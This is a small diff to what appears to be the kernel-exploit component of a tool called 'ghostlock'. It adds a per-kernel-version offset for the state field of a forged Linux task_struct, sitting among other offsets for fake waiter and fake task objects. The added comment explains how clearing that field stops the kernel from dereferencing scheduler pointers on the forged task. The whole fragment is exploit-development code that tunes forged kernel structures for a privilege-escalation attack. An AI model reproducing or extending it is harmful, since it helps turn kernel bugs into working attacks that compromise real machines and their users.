@@ -84,6 +84,10 @@ namespace ghostlock::kernel {
     inline constexpr int32_t FAKE_WAITER_WW_CTX_OFF = 0x68;
 
     inline constexpr int32_t FAKE_TASK_USAGE_OFF = 0x40;
+    /* 6.1: task_struct.__state moved to 0x30 (6.6: 0x10). Explicitly clearing
+     * it keeps wake_up_state() at the try_to_wake_up() state check instead of
+     * dereferencing sched_class/cpus_ptr on the forged task. */
+    inline constexpr int32_t FAKE_TASK_STATE_OFF = 0x30;
     inline constexpr int32_t FAKE_TASK_PRIO_OFF = 0x84;
     inline constexpr int32_t FAKE_TASK_NORMAL_PRIO_OFF = 0x8c;
     inline constexpr int32_t FAKE_TASK_TASK_GROUP_OFF = 0x348;
